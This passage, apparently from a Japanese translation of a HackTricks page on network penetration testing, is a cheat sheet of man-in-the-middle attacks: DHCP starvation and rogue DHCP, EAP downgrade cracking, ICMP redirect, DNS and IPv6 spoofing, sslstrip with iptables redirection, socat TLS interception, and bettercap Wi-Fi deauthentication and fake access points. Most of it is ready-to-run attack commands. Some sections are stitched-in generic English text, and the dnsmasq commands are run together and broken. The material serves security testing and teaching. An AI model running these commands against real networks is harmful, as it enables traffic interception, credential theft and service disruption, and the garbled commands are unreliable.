```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
より自動的な方法は、[DHCPing](https://github.com/kamorin/DHCPig)というツールを使用することです。

環境内のクライアントに新しいリースを取得させ、正規のサーバーを使い果たして応答しなくなるようなDoS攻撃を使用することができます。したがって、正規のサーバーが再接続しようとすると、**次の攻撃で言及される悪意のある値を提供することができます**。

#### 悪意のある値の設定

Responder DHCPスクリプト（_/usr/share/responder/DHCP.py_）を使用して、ローグDHCPサーバーを確立することができます。悪意のあるゲートウェイを設定することは理想的ではありません。なぜなら、乗っ取られた接続は半二重であるため（つまり、クライアントからの出力パケットはキャプチャされますが、正規のゲートウェイからの応答はキャプチャされません）、特にHTTPトラフィックと資格情報をキャプチャするために、ローグDNSまたはWPADサーバーを設定することをお勧めします。

| 説明                                 | 例                                                                      |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| ゲートウェイとしてアドバタイズされるIPアドレス     | _-i 10.0.0.100_                                                              |
| ローカルDNSドメイン名（オプション）        | _-d example.org_                                                             |
| オリジナルのルーター/ゲートウェイのIPアドレス   | _-r 10.0.0.1_                                                                |
| プライマリDNSサーバーのIPアドレス               | _-p 10.0.0.100_                                                              |
| セカンダリDNSサーバーのIPアドレス（オプション）  | _-s 10.0.0.1_                                                                |
| ローカルネットワークのネットマスク            | _-n 255.255.255.0_                                                           |
| DHCPトラフィックを受信するインターフェース | _-I eth1_                                                                    |
| WPAD構成アドレス（URL）            | _-w “_[http://10.0.0.100/wpad.dat\n”](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| デフォルトゲートウェイのIPアドレスを偽装する        | -S                                                                           |
| すべてのDHCPリクエストに応答する（非常にノイズが多い）   | -R                                                                           |

### **EAP攻撃**

以下は、802.1X実装に対して使用できる攻撃戦術のいくつかです：

* EAPを介したアクティブなブルートフォースパスワード攻撃
* 異常なEAPコンテンツ（エクスプロイト）によるRADIUSサーバーへの攻撃
* EAPメッセージのキャプチャとオフラインパスワードクラッキング（EAP-MD5およびPEAP）
* EAP-MD5認証を強制してTLS証明書の検証をバイパスする
* ハブまたは類似のものを使用して認証後に悪意のあるネットワークトラフィックを注入する

攻撃者が被害者と認証サーバーの間にいる場合、必要に応じて認証プロトコルをEAP-MD5に低下させ、認証試行をキャプチャすることができます。その後、次の方法を使用してブルートフォース攻撃を行うことができます：
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP（GLBP＆HSRP）攻撃 <a href="#6196" id="6196"></a>

**FHRP**（First Hop Redundancy Protocol）は、**ホット冗長ルーティングシステムを作成するためのネットワークプロトコルのクラス**です。FHRPを使用すると、物理ルータを1つの論理デバイスに組み合わせることができ、信頼性を向上させ、負荷を分散するのに役立ちます。

**Cisco Systemsのエンジニアは、GLBPとHSRPの2つのFHRPプロトコルを開発しました。**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

ルーティング情報プロトコル（RIP）には、RIP、RIPv2、およびRIPngの3つのバージョンが存在します。RIPとRIPv2は、ポート520を介してピアに送信されるUDPデータグラムを使用します。一方、RIPngはIPv6マルチキャストを介してUDPポート521にデータグラムをブロードキャストします。RIPv2ではMD5認証のサポートが導入されました。RIPngにはネイティブの認証は組み込まれておらず、代わりにIPv6内のオプションのIPsec AHおよびESPヘッダに依存しています。

このプロトコルを攻撃する方法の詳細については、書籍「_**Network Security Assessment: Know Your Network (3rd edition)**_」を参照してください。

### EIGRP攻撃

**EIGRP（Enhanced Interior Gateway Routing Protocol）**は、動的ルーティングプロトコルです。**距離ベクトルプロトコルです。**認証がなく、パッシブインターフェースの設定がない場合、**侵入者**はEIGRPルーティングに干渉し、**ルーティングテーブルの改ざん**を引き起こすことができます。さらに、EIGRPネットワーク（つまり、自律システム）は**フラットで、任意のゾーンにセグメント化されていません**。**攻撃者がルートを注入**すると、このルートは自律EIGRPシステム全体に**広がる可能性があります**。

EIGRPシステムを攻撃するには、**正規のEIGRPルータとの隣接関係を確立**する必要があります。これにより、基本的な偵察からさまざまなインジェクションまで、さまざまな可能性が開かれます。

\*\*\*\*[**FRRouting**](https://frrouting.org/)を使用すると、BGP、OSPF、EIGRP、RIPなどのプロトコルをサポートする**仮想ルータを実装**できます。攻撃者のシステムに展開するだけで、ルーティングドメイン内の正規のルータのふりをすることができます。

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/)もEIGRPブロードキャストのキャプチャとルーティング構成の操作のためのパケットのインジェクションをサポートしています。Colyを使用して攻撃する方法の詳細については、書籍「_**Network Security Assessment: Know Your Network (3rd edition)**_」を参照してください。

### OSPF

ほとんどのOpen Shortest Path First（OSPF）の実装では、MD5を使用してルータ間の認証を提供しています。LokiとJohn the Ripperは、MD5ハッシュをキャプチャして攻撃し、キーを明らかにすることができます。これを使用して新しいルートを広告することができます。ルートパラメータは、_Injection_タブを使用して設定し、キーは_Connection_の下で設定されます。

このプロトコルを攻撃する方法の詳細については、書籍「_**Network Security Assessment: Know Your Network (3rd edition)**_」を参照してください。

### その他の一般的なツールとソース

* [**Above**](https://github.com/c4s73r/Above)：ネットワークトラフィックをスキャンして脆弱性を見つけるためのツール
* ネットワーク攻撃に関する詳細な情報は、[こちら](https://github.com/Sab0tag3d/MITM-cheatsheet)を参照してください。 （TODO：すべてを読み、新しい攻撃があればすべてを読む）_

## **スプーフィング**

攻撃者は、偽のDHCP応答を送信することで、新しいネットワークメンバーのすべてのネットワークパラメータ（GW、IP、DNS）を設定します。
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARPスプーフィング

[前のセクション](./#arp-spoofing)を確認してください。

### ICMPリダイレクト

ICMPリダイレクトは、ICMPパケットタイプ1コード5を送信することで、攻撃者がIPに到達する最適な方法であることを示すものです。その後、被害者がIPに接触しようとすると、パケットは攻撃者を介して送信されます。
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNSスプーフィング

攻撃者は、被害者が要求するドメインのいくつか（またはすべて）を解決します。
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasqを使用して独自のDNSを設定する**

dnsmasq is a lightweight DNS forwarder and DHCP server that can be used to configure your own DNS server. It is commonly used in penetration testing to redirect DNS queries to a controlled server, allowing for the interception and manipulation of network traffic.

To configure your own DNS server using dnsmasq, follow these steps:

1. Install dnsmasq on your machine. On Ubuntu, you can use the following command:

   ```
   sudo apt-get install dnsmasq
   ```

2. Once installed, open the dnsmasq configuration file using a text editor. On Ubuntu, the file is located at `/etc/dnsmasq.conf`.

3. Uncomment the `listen-address` directive and set it to the IP address of your machine. This will make dnsmasq listen on that IP address for DNS queries.

   ```
   listen-address=192.168.0.100
   ```

4. Uncomment the `address` directive to define the DNS records you want to serve. Each record should be in the format `address=/example.com/192.168.0.200`, where `example.com` is the domain name and `192.168.0.200` is the IP address you want to associate with it.

   ```
   address=/example.com/192.168.0.200
   ```

5. Save the configuration file and restart dnsmasq for the changes to take effect.

   ```
   sudo systemctl restart dnsmasq
   ```

6. Configure your machine or network to use the IP address of your machine as the DNS server. This can usually be done in the network settings of your operating system or router.

Now, when devices on your network make DNS queries, dnsmasq will respond with the IP addresses you have defined in the configuration file. This allows you to redirect traffic to your own controlled server for further analysis or manipulation.

Note: Make sure to use this technique responsibly and only on networks you have permission to test.
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### ローカルゲートウェイ

通常、システムやネットワークへの複数の経路が存在します。ローカルネットワーク内のMACアドレスのリストを作成した後、_gateway-finder.py_ を使用してIPv4フォワーディングをサポートするホストを特定します。
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [LLMNR、NBT-NS、およびmDNSのスプーフィング](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Microsoftのシステムでは、DNSの検索が失敗した場合に、リンクローカルマルチキャスト名解決（LLMNR）とNetBIOS名サービス（NBT-NS）を使用して、ローカルホストの解決を行います。Apple BonjourやLinuxのゼロ構成実装では、マルチキャストDNS（mDNS）を使用してネットワーク内のシステムを検出します。これらのプロトコルは認証されておらず、UDP上でブロードキャストメッセージを送信するため、攻撃者はこれらを悪意のあるサービスにユーザーを誘導するために悪用することができます。

Responderを使用して偽の応答を送信することで、ホストが検索するサービスをなりすますことができます。\
[Responderを使用したサービスのなりすましについての詳細はこちらを参照してください](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)。

### [WPADのスプーフィング](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

多くのブラウザは、ネットワークからプロキシ設定を読み込むためにWeb Proxy Auto-Discovery（WPAD）を使用します。WPADサーバーは、次のいずれかを通じて特定のURL（例：[http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)）を介してクライアントのプロキシ設定を提供します。

* DHCP（コード252のエントリを使用）[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* ローカルドメインで_wpad_ホスト名を検索するDNS
* Microsoft LLMNRおよびNBT-NS（DNSの検索が失敗した場合）

ResponderはWPAD攻撃を自動化し、プロキシを実行し、DHCP、DNS、LLMNR、およびNBT-NSを介してクライアントを悪意のあるWPADサーバーに誘導します。\
[Responderを使用したサービスのなりすましについての詳細はこちらを参照してください](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)。

### [SSDPおよびUPnPデバイスのスプーフィング](spoofing-ssdp-and-upnp-devices.md)

ネットワーク内で異なるサービスを提供し、ユーザーを騙して平文の資格情報を入力させることができます。**この攻撃についての詳細は**[**SSDPおよびUPnPデバイスのスプーフィング**](spoofing-ssdp-and-upnp-devices.md)**を参照してください**。

### IPv6 Neighbor Spoofing

この攻撃はARP Spoofingと非常に似ていますが、IPv6の世界で行われます。被害者には、GWのIPv6が攻撃者のMACアドレスを持っていると思わせることができます。
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6ルーター広告のスプーフィング/フラッディング

一部のOSは、ネットワーク内で送信されるRAパケットからデフォルトでゲートウェイを設定します。攻撃者をIPv6ルーターとして宣言するためには、次の方法を使用できます：
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCPスプーフィング

デフォルトでは、一部のOSはネットワーク内のDHCPv6パケットを読み取ってDNSを設定しようとします。そのため、攻撃者は自身をDNSとして設定するためにDHCPv6パケットを送信することができます。DHCPはまた、被害者にIPv6を提供します。
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP（偽のページとJSコードの挿入）

## インターネット攻撃

### sslStrip

この攻撃は、**ユーザー**が**アクセスしようとする**HTTPページが**HTTPS**バージョンに**リダイレクト**される場合に行われます。**sslStrip**は**クライアントとのHTTP接続**と**サーバーとのHTTPS接続**を**維持**するため、接続を**平文**で**嗅ぎ取る**ことができます。
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
詳細は[こちら](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)を参照してください。

### HSTS回避のためのsslStrip+とdns2proxy

**sslStrip+とdns2proxy**は**sslStrip**とは異なり、例えば_**www.facebook.com**_を_**wwww.facebook.com**_（**w**が追加されていることに注意）に**リダイレクト**し、このドメインの**アドレスを攻撃者のIPに設定**します。これにより、**クライアント**は_**wwww.facebook.com**_（攻撃者）に**接続**しますが、裏では**sslstrip+**が**www.facebook.com**とのhttps接続を**維持**します。

この技術の目的は、_**wwww**.facebook.com_がブラウザの**キャッシュ**に保存されないようにすることで、HSTSを回避することです。そのため、ブラウザは**facebookの認証をHTTPで実行**するように騙されます。\
この攻撃を実行するためには、被害者が最初に[http://www.faceook.com](http://www.faceook.com)にアクセスしようとする必要があります。これは、httpページ内のリンクを変更することで実現できます。

詳細は[こちら](https://www.bettercap.org/legacy/#hsts-bypass)、[こちら](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014)、および[こちら](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)を参照してください。

**sslStripまたはsslStrip+はもはや機能しません。これは、ブラウザに事前保存されたHSTSルールがあるためです。したがって、ユーザーが「重要な」ドメインに初めてアクセスする場合でも、HTTPS経由でアクセスされます。また、事前保存されたルールと他の生成されたルールには、**`includeSubdomains`**フラグを使用することができるため、以前の_**wwww.facebook.com**_の例は_**facebook.com**_が`includeSubdomains`を使用してHSTSを使用するため、もはや機能しません。**

TODO: easy-creds、evilgrade、metasploit、factory

## ポートでのTCPリッスン
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSLポートでのリッスン

#### キーと自己署名証明書の生成
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 証明書を使用して盗聴する

When performing network penetration testing, it is important to be able to intercept and listen to network traffic in order to gather information and identify potential vulnerabilities. One method of doing this is by using a certificate to decrypt encrypted traffic.

During the initial handshake process of a secure connection, the client and server exchange certificates to establish trust. By obtaining the server's private key or the client's private key and certificate, an attacker can decrypt the encrypted traffic and listen to the communication.

To listen using a certificate, the attacker needs to perform a Man-in-the-Middle (MitM) attack. This involves intercepting the traffic between the client and server and relaying it back and forth. The attacker acts as a proxy, decrypting the traffic using the private key and certificate, and then re-encrypting it before forwarding it to the intended recipient.

To successfully perform this attack, the attacker needs to have access to the private key and certificate. This can be achieved through various means, such as compromising the server or client, stealing the private key, or exploiting vulnerabilities in the encryption protocol.

It is important to note that this method of listening using a certificate is highly illegal and unethical unless performed with proper authorization and consent. It is strictly for educational purposes and should never be used for malicious activities.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 証明書を使用してリッスンし、ホストにリダイレクトする

To perform this technique, you will need a valid SSL/TLS certificate for the target domain. This certificate will allow you to establish a secure connection with the target server. Once you have obtained the certificate, you can use it to set up a listener on your own machine.

To redirect traffic to the target hosts, you will need to modify the DNS settings or the hosts file on the target machine. By redirecting the traffic to your machine, you can intercept and analyze the network traffic between the target and the server.

Here are the steps to follow:

1. Obtain a valid SSL/TLS certificate for the target domain.
2. Set up a listener on your machine using the obtained certificate.
3. Modify the DNS settings or the hosts file on the target machine to redirect traffic to your machine.
4. Start the listener and wait for traffic to be redirected to your machine.
5. Analyze the intercepted network traffic for any vulnerabilities or sensitive information.

By using this technique, you can gain valuable insights into the network communication between the target and the server, allowing you to identify potential security weaknesses or data leaks.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
クライアントがCAが有効であることを確認する場合、**他のホスト名で署名された証明書を提供する**ことがあります。\
もう1つの興味深いテストは、**要求されたホスト名の自己署名証明書を提供する**ことです。

他にテストすることは、有効なCAではない有効な証明書で証明書に署名しようとすることです。また、有効な公開鍵を使用して、ディフィーヘルマンなどのアルゴリズムを強制的に使用し、実際の秘密鍵で何も復号化する必要のないアルゴリズムを使用し、クライアントが実際の秘密鍵のプローブ（ハッシュなど）を要求すると、偽のプローブを送信し、クライアントがこれをチェックしないことを期待することです。

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### アクティブディスカバリのノート

要求されたポートを持たないデバイスにUDPパケットが送信されると、ICMP（ポート到達不能）が送信されることに注意してください。

### **ARPディスカバリ**

ARPパケットは、ネットワーク内で使用されているIPを発見するために使用されます。PCは各可能なIPアドレスに対してリクエストを送信し、使用されているIPのみが応答します。

### **mDNS（マルチキャストDNS）**

Bettercapは、**\_services\_.dns-sd.\_udp.local**を要求するMDNSリクエスト（Xミリ秒ごとに）を送信します。このパケットを受け取るマシンは通常、このリクエストに応答します。その後、"services"に応答するマシンのみを検索します。

**ツール**

* Avahi-browser（--all）
* Bettercap（net.probe.mdns）
* Responder

### **NBNS（NetBios名前サーバ）**

Bettercapは、ポート137/UDPに対して名前"CKAAAAAAAAAAAAAAAAAAAAAAAAAAA"を要求するブロードキャストパケットを送信します。

### **SSDP（シンプルサービスディスカバリプロトコル）**

Bettercapは、すべての種類のサービスを検索するためにSSDPパケットをブロードキャストします（UDPポート1900）。

### **WSD（Webサービスディスカバリ）**

Bettercapは、サービスを検索するためにWSDパケットをブロードキャストします（UDPポート3702）。

## 参考文献

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**バグバウンティのヒント**: **Intigriti**に**サインアップ**してください。これは、ハッカーによって作成されたプレミアムな**バグバウンティプラットフォーム**です！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。これは、私たちの独占的な[NFT](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
